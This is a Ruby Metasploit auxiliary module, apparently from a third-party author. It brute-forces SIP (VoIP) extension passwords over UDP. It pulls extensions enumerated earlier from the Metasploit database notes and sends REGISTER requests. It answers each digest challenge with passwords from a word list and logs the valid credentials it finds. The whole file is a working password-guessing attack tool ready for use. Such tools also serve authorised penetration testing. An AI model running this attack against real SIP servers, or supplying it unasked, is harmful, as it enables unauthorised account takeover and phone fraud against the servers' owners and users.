##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
    include Msf::Auxiliary::Report
    include Msf::Auxiliary::Scanner
    include Msf::Auxiliary::AuthBrute
  
    def initialize
      super(
        'Name'           => 'SIP Password Cracker (UDP) - Using Enumerated Users from Notes',
        'Description'    => 'This module attempts to brute-force the password of SIP extensions already enumerated in the Metasploit database (use first auxiliary/scanner/sip/enumerator, extensions will be stored as notes).',
        'Author'         => 'ƀr!сКё∂',
        'License'        => MSF_LICENSE,
               'References'     =>
          [
            ['URL', 'https://github.com/rapid7/metasploit-framework']
          ],
        'DefaultOptions' =>
          {
            'RPORT' => 5060,
            'CPORT' => 5065,
            'THROTTLE' => 1, # Default throttle delay in seconds
            'BRUTEFORCE_SPEED' => 5, # Default brute-force speed
            'STOP_ON_SUCCESS' => false, # Stop on first successful login
            'VERBOSE' => true # Print output for all attempts
          }
      )
  
      register_options(
        [
          OptPath.new('PASS_FILE', [false, 'File containing passwords, one per line', '~/SIP_Pass.txt']),
          OptPath.new('USER_FILE', [false, 'File containing usernames, one per line']),
          OptPath.new('USERPASS_FILE', [false, 'File containing users and passwords separated by space, one pair per line']),
          OptString.new('USERNAME', [false, 'A specific username to authenticate as']),
          OptString.new('PASSWORD', [false, 'A specific password to authenticate with']),
          OptBool.new('DB_ALL_NOTES_EXTENSIONS', [true, 'Fetch SIP extensions from notes for the target IP', true]),
          OptBool.new('DB_ALL_CREDS', [false, 'Try each user/password couple stored in the current database']),
          OptBool.new('DB_ALL_USERS', [false, 'Add all users in the current database to the list']),
          OptBool.new('DB_ALL_PASS', [false, 'Add all passwords in the current database to the list']),
          OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users']),
          OptBool.new('BLANK_PASSWORDS', [false, 'Try blank passwords for all users']),
          OptBool.new('ANONYMOUS_LOGIN', [false, 'Attempt to login with a blank username and password']),
          OptEnum.new('DB_SKIP_EXISTING', [false, 'Skip existing credentials stored in the current database', 'none', ['none', 'user', 'user&realm']]),
          OptInt.new('THROTTLE', [true, 'Throttle delay between requests (in seconds)', 1]),
          OptInt.new('BRUTEFORCE_SPEED', [true, 'How fast to bruteforce, from 0 to 5', 5]),
          OptInt.new('THREADS', [true, 'The number of concurrent threads (max one per host)', 1]),
          OptBool.new('STOP_ON_SUCCESS', [true, 'Stop guessing when a credential works for a host', false]),
          OptBool.new('VERBOSE', [true, 'Whether to print output for all attempts', true])
        ]
      )
    end
  
    def rport
      datastore['RPORT'].to_i
    end
  
    def lport
      datastore['CPORT'].to_i
    end
  
    def extip
      datastore['EXTIP'] || Rex::Socket.source_address(datastore['RHOSTS'])
    end
  
    # Fetch enumerated SIP users from the Metasploit database notes
    def fetch_enumerated_users(ip)
        users = []
        return users unless datastore['DB_ALL_NOTES_EXTENSIONS']
      
        # Iterate over all notes in the workspace
        framework.db.workspace.notes.each do |note|
            
          # Check if the note is for the target IP and contains SIP user information
          if note.data.to_s.include?(ip) || note.ntype.to_s.include?(ip)
            # Extract the SIP user using a regex that supports both formats
            if note.data.to_s =~ /Found user: (\d+) <sip:\d+@#{ip}> \[Auth\]/ || note.ntype.to_s =~ /Found user: (\d+) <sip:\d+@#{ip}> \[Auth\]/
              users << $1
            end
          end
        end
      
        users.uniq
      end
    # Operate on a single system at a time
    def run_host(ip)
        udp_sock = nil  # Initialize udp_sock to nil
        begin
          meth = "REGISTER"
          # Fetch enumerated users from the database notes
          users = fetch_enumerated_users(ip)
          if users.empty?
            print_error("No enumerated SIP users found in the database for #{ip}.")
            return
          end
      
          print_status("Found #{users.length} enumerated SIP users for #{ip}: #{users.join(', ')}")
      
          # Load passwords from PASS_FILE
          pass_file = File.expand_path(datastore['PASS_FILE'])
          unless File.exist?(pass_file)
            print_error("Password file not found: #{pass_file}")
            return
          end
      
          passwords = File.readlines(pass_file).map(&:chomp)
          if passwords.empty?
            print_error("No passwords found in the password file: #{pass_file}")
            return
          end
      
          print_status("Loaded #{passwords.length} passwords from #{pass_file}")
      
          # Try each password on a new user
          passwords.each do |pass|
            users.each do |user|
              print_status("Testing: #{user}:#{pass}")
      
              # Create an unbound UDP socket if no CHOST is specified, otherwise
              # create a UDP socket bound to CHOST (in order to avail of pivoting)
              udp_sock = Rex::Socket::Udp.create(
                {
                  'LocalHost' => datastore['CHOST'] || nil,
                  'LocalPort' => datastore['CPORT'].to_i,
                  'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
                }
              )
              add_socket(udp_sock)
      
              # Initial REGISTER request
              data = create_probe(ip, user, meth)
              begin
                udp_sock.sendto(data, ip, rport, 0)
              rescue ::Interrupt
                raise $!
              rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
                print_error("Failed to send REGISTER request to #{ip}:#{rport}.")
                next
              end
      
              # Get SIP digest challenge, resolve and send it
              res = udp_sock.recvfrom(65535, 1.0) # Increase timeout to 1 second
              if res && res[0] && !res[0].empty?
                data = resolve_challenge(res, meth, user, pass)
                if data
                  begin
                    udp_sock.sendto(data, ip, rport, 0)
                  rescue ::Interrupt
                    raise $!
                  rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
                    print_error("Failed to send challenge response to #{ip}:#{rport}.")
                    next
                  end
                else
                  print_error("Failed to resolve challenge for user #{user}.")
                  next
                end
              else
                print_error("No response received from the SIP server for user #{user}.")
                next
              end
      
              # Receive and parse final response
              res = udp_sock.recvfrom(65535, 1.0) # Increase timeout to 1 second
              parse_reply(res, ip, user, pass)
      
              # Throttle requests to avoid blocking
              sleep(datastore['THROTTLE'])
            end
          end
        rescue ::Interrupt
          raise $!
        rescue ::Exception => e
          print_error("Unknown error: #{e.class} #{e}")
        ensure
          udp_sock.close if udp_sock  # Only close udp_sock if it was initialized
        end
      end
  
    # SIP requests creator
    def create_probe(ip, toext, meth)
      suser = Rex::Text.rand_text_alphanumeric(rand(8) + 1)
      shost = Rex::Socket.source_address(ip)
      src   = "#{shost}:#{datastore['CPORT']}"
  
      data  = "#{meth} sip:#{toext}@#{ip} SIP/2.0\r\n"
      data << "Via: SIP/2.0/UDP #{src};branch=z9hG4bK.#{"%.8x" % rand(0x100000000)};rport;alias\r\n"
      data << "From: #{toext} <sip:#{suser}@#{src}>;tag=70c00e8c\r\n"
      data << "To: #{toext} <sip:#{toext}@#{ip}>\r\n"
      data << "Call-ID: #{rand(0x100000000)}@#{shost}\r\n"
      data << "CSeq: 1 #{meth}\r\n"
      data << "Contact: <sip:#{suser}@#{src}>\r\n"
      data << "Content-Length: 0\r\n"
      data << "Max-Forwards: 20\r\n"
      data << "User-Agent: #{suser}\r\n"
      data << "Accept: text/plain\r\n"
    end
  
    # Register challenge resolver
    def resolve_challenge(pkt, meth, ext, pass)
      if pkt && pkt[0] && !pkt[0].empty?
        # Extract the WWW-Authenticate header
        if pkt[0] =~ /^WWW-Authenticate:\s*(.*)$/i
          auth_header = $1.strip
  
          # Extract realm and nonce
          realm = auth_header.match(/realm="([^"]+)"/i)&.captures&.first
          nonce = auth_header.match(/nonce="([^"]+)"/i)&.captures&.first
  
          if realm && nonce
            @prealm = realm
            pnonce = nonce
            return create_request(meth, ext, pass, realm, nonce)
          else
            print_error("Failed to extract realm or nonce from WWW-Authenticate header.")
          end
        else
          print_error("No WWW-Authenticate header found in the response.")
        end
      else
        print_error("Received nil or empty packet data.")
      end
      nil
    end
  
    # SIP requests creator with authentication
    def create_request(meth, ext, pass, realm, nonce)
      suser = Rex::Text.rand_text_alphanumeric(rand(8) + 1)
      shost = Rex::Socket.source_address(datastore['RHOSTS'])
      src   = "#{shost}:#{datastore['CPORT']}"
  
      data  = "#{meth} sip:#{ext}@#{datastore['RHOSTS']} SIP/2.0\r\n"
      data << "Via: SIP/2.0/UDP #{src};branch=z9hG4bK.#{"%.8x" % rand(0x100000000)};rport;alias\r\n"
      data << "From: #{ext} <sip:#{suser}@#{src}>;tag=70c00e8c\r\n"
      data << "To: #{ext} <sip:#{ext}@#{datastore['RHOSTS']}>\r\n"
      data << "Call-ID: #{rand(0x100000000)}@#{shost}\r\n"
      data << "CSeq: 2 #{meth}\r\n"
      data << "Contact: <sip:#{suser}@#{src}>\r\n"
      data << "Authorization: Digest username=\"#{ext}\", realm=\"#{realm}\", nonce=\"#{nonce}\", uri=\"sip:#{datastore['RHOSTS']}\", response=\"#{get_digest(ext, realm, pass, nonce, meth)}\"\r\n"
      data << "Content-Length: 0\r\n"
      data << "Max-Forwards: 20\r\n"
      data << "User-Agent: #{suser}\r\n"
      data << "Accept: text/plain\r\n"
    end
  
    # SIP digest calculator
    def get_digest(username, realm, pwd, nonce, meth)
      ha1 = Digest::MD5.hexdigest("#{username}:#{realm}:#{pwd}")
      ha2 = Digest::MD5.hexdigest("#{meth}:sip:#{realm}")
      response = Digest::MD5.hexdigest("#{ha1}:#{nonce}:#{ha2}")
    end
  
    # Final response parser
    def parse_reply(pkt, ip, user, pass)
      if pkt && pkt[0] && !pkt[0].empty?
        resp = pkt[0].to_s.split(/\s+/)[1]
        if resp && resp.to_i == 200
          print_good("Found valid login: user = \"#{user}\" pass = \"#{pass}\" realm = \"#{@prealm}\"")
          report_auth_info(
            host: ip,
            port: rport,
            sname: 'sip',
            user: user,
            pass: pass,
            proof: "Realm: #{@prealm}",
            active: true
          )
        elsif resp && resp.to_i == 401
          print_error("Incorrect password for user #{user}.")
        else
          print_error("Unexpected response code: #{resp}")
        end
      else
        print_error("Received nil or empty packet data.")
      end
    end
  end
